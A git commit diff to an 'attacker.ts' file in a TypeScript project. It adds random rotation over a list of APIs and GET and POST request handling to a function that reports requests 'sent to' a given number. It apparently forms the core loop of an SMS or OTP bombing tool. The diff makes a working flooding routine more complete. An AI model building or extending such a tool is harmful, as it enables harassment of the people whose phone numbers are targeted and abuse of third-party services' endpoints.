2f5b78891dcd6ee7c2497f28bfc71be477202d94
hadi <hadiazari30@gmail.com>
2023-12-25 00:04:55 +0330

    handling headers

--- src/functions/attacker.ts
+++ src/functions/attacker.ts
@@ -5,10 +5,10 @@ import { Logger } from "./logger";
 
 export const Attacker = async (num: number, Loop: string) => {
   return new Promise((resolve, reject) => {
-    // const API = APIs(num)[Math.floor(Math.random() * APIs(num).length)];
-    const API = APIs(num)[5];
-    var headers = {};
-    if (API.headers) headers = API.headers;
+    const API = APIs(num)[Math.floor(Math.random() * APIs(num).length)];
+    // const API = APIs(num)[8];
+    var headers: object;
+    headers = API.headers;
 
     if (API.method == "POST") {
       axios
@@ -29,31 +29,22 @@ export const Attacker = async (num: number, Loop: string) => {
               reject(
                 `Request From ${API.name} Failed \n${res.data.error.message}`
               );
-            //  else if (res.status === 200) {
-            //   resolve(`Request From ${API.name} Sends To ${num}`);
-            // }
+            else if (res.status === 200)
+              resolve(`Request From ${API.name} Sends To ${num}`);
           }
         )
-        .catch((error) => {
-          // resolve(`${API.name} : \n${error.response.statusText}`);
-          console.log(
-            color.white.bgRedBright(
-              `${API.name} : \n${error.response.statusText}`
-            )
-          );
+        .catch((error: { response: { statusText: string } }) => {
+          reject(`${API.name} : \n${error.response.statusText}`);
         });
-
-      // } else {
-      //   axios
-      //     .get(API.url.headers)
-      //     .then(function () {
-      //       console.log(
-      //         color.green(`Request From ${API.name} Sends To ${number} | ${q++}`)
-      //       );
-      //     })
-      //     .catch((error) => {
-      //       console.log(color.red(`ERROR :\n${error}`));
-      //     });
+    } else {
+      axios
+        .get(API.url, headers)
+        .then(() => {
+          resolve(`Request From ${API.name} Sends To ${num}`);
+        })
+        .catch((error: { response: { statusText: string } }) => {
+          reject(`${API.name} : \n${error.response.statusText}`);
+        });
     }
   });
 };
